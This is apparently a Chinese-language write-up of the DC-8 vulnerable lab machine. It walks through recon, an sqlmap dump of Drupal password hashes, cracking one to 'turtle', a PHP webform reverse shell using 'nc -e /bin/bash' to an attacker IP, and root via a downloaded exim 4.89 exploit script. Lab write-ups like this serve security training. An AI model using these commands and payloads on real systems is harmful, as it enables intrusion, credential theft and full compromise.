# 信息收集

靶机IP:192.168.1.117

### 1.访问首页面发现三个页面的url由数字控制

![1665983528_634ce428ef8c9e5584bfc.png!small?1665983529430](https://image.3001.net/images/20221017/1665983528_634ce428ef8c9e5584bfc.png!small?1665983529430)

<http://192.168.1.117/?nid=2>  

bp爆破发现一个sql语句，一个路径.

  * SELECT title FROM node WHERE nid = 10

  * /var/www/html/sites/all/modules/mypages/mypages.module

![1665983550_634ce43e227e634a66dda.png!small?1665983550141](https://image.3001.net/images/20221017/1665983550_634ce43e227e634a66dda.png!small?1665983550141)

### 2.在<http://192.168.1.117/node/3>页面发现一个用户admin的邮件发送页面

![1665983573_634ce4551cbe9625323df.png!small?1665983572940](https://image.3001.net/images/20221017/1665983573_634ce4551cbe9625323df.png!small?1665983572940)

![1665983587_634ce463559c5f8d526f0.png!small?1665983587255](https://image.3001.net/images/20221017/1665983587_634ce463559c5f8d526f0.png!small?1665983587255)

### 3.网站CMS

![1665983598_634ce46e3c786dec9be63.png!small?1665983598176](https://image.3001.net/images/20221017/1665983598_634ce46e3c786dec9be63.png!small?1665983598176)

### 4.端口探测 22、80

    
    
    nmap -T4 -A -v 192.168.1.117

![1665983610_634ce47a2e6182f4c1142.png!small?1665983610316](https://image.3001.net/images/20221017/1665983610_634ce47a2e6182f4c1142.png!small?1665983610316)

### 5.目录扫描

    
    
    http://192.168.1.117/user/login/ 登录界面  
    http://192.168.1.117/xmlrpc.php   
    http://192.168.1.117/robots.txt        
    ​

访问xmlepc.php 构造请求包查看允许的方法。

![1665983624_634ce488a03f0e3744b06.png!small?1665983624521](https://image.3001.net/images/20221017/1665983624_634ce488a03f0e3744b06.png!small?1665983624521)

请求包：

    
    
    GET /xmlrpc.php HTTP/1.1  
    Host: 192.168.1.117  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Connection: close  
    Cookie: has_js=1  
    Upgrade-Insecure-Requests: 1  
    Content-Length: 91  
    ​  
    <methodCall>  
    <methodName>system.listMethods</methodName>  
    <params></params>  
    </methodCall>

返回包：发现没有可利用的方法。

![1665983641_634ce499e1a643a7a72e6.png!small?1665983641872](https://image.3001.net/images/20221017/1665983641_634ce499e1a643a7a72e6.png!small?1665983641872)

访问robots.txt

![1665983657_634ce4a9edde4c8cdd2c4.png!small?1665983657982](https://image.3001.net/images/20221017/1665983657_634ce4a9edde4c8cdd2c4.png!small?1665983657982)

# 渗透过程

### 1.sqlmap爆破发现存在注入点，尝试注入。

    
    
    http://192.168.1.117/?nid=1

payload:

数据库：d7db 数据表：users 列：name、pass

    
    
    sqlmap -u http://192.168.1.117/?nid=1 --cookie="has_js:"1"" --batch -D d7db -T users -C "name,pass" --dump  
    ​  
    admin $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z   
    john  $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF   
    ​

![1665983677_634ce4bda248cc34118a7.png!small?1665983678007](https://image.3001.net/images/20221017/1665983677_634ce4bda248cc34118a7.png!small?1665983678007)

john爆破

![1665983688_634ce4c8a8040bd2984f8.png!small?1665983688657](https://image.3001.net/images/20221017/1665983688_634ce4c8a8040bd2984f8.png!small?1665983688657)

### 2.账号密码：john/turtle 登录成功

![1665983699_634ce4d3e2f450b83f131.png!small?1665983699836](https://image.3001.net/images/20221017/1665983699_634ce4d3e2f450b83f131.png!small?1665983699836)

### 3.drupal php模板漏洞利用

Add content——Webfrom——Find contert——WebForm——Form setting

![1665983715_634ce4e31399e68fd1251.png!small?1665983715073](https://image.3001.net/images/20221017/1665983715_634ce4e31399e68fd1251.png!small?1665983715073)

写入php反弹shell

    
    
    <?php system("nc -e /bin/bash 192.168.1.110 3333"); ?>

![1665983730_634ce4f23360d6698e0de.png!small?1665983730197](https://image.3001.net/images/20221017/1665983730_634ce4f23360d6698e0de.png!small?1665983730197)

发送邮件你kali监听

    
    
    nc -lvvp 3333

![1665983741_634ce4fd878a908088d22.png!small?1665983741762](https://image.3001.net/images/20221017/1665983741_634ce4fd878a908088d22.png!small?1665983741762)

# 提权

### 查看那些命令有root权限

    
    
    find / -perm -u=s -type f 2>/dev/null

![1665983752_634ce5084a3311ad003f1.png!small?1665983752362](https://image.3001.net/images/20221017/1665983752_634ce5084a3311ad003f1.png!small?1665983752362)

发现exim4

### 查看exim4版本,在msfconsole搜索漏洞

    
    
    exim4 --version  
    exim version 4.89

![1665983778_634ce522365bfb5cdd368.png!small?1665983778426](https://image.3001.net/images/20221017/1665983778_634ce522365bfb5cdd368.png!small?1665983778426)

将46996.sh复制到kali的网站根目录下(/var/www/html)

在靶机上的/var/tmp目录执行：因为此目录有写的权限

    
    
    wget http://kaliIP/46996.sh

然后赋权：chmod 777 46996.sh

在46996.sh，里面发现两个执行sh脚本命令：

![1665983790_634ce52ec4a4ae1f01b7a.png!small?1665983790767](https://image.3001.net/images/20221017/1665983790_634ce52ec4a4ae1f01b7a.png!small?1665983790767)

经尝试./46996.sh -m netcat 成功提权。

![1665983802_634ce53a1340349a0dde9.png!small?1665983802059](https://image.3001.net/images/20221017/1665983802_634ce53a1340349a0dde9.png!small?1665983802059)

# 总结：

漏洞利用点,SQL注入、drupal php漏洞模板。

在DC8中加强了我对sqlmap、john、searchsploit工具的使用。

从含有root权限的命令入手提权

